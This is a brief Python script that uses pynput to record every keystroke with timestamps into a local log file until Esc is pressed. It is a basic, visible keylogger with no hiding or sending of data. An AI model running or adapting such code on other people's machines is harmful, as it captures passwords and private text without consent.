from pynput import keyboard
import logging
  
LOG_FILENAME = ''
logging.basicConfig(filename=(LOG_FILENAME + "keyboard_log.txt"),level=logging.DEBUG, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

def on_press(key):
    try:   
        logging.info('alphanumeric key {0} pressed'.format(
            key.char))
    except AttributeError:
        logging.info('special key {0} pressed'.format(
            key))

def on_release(key):
    print('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
       # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join() 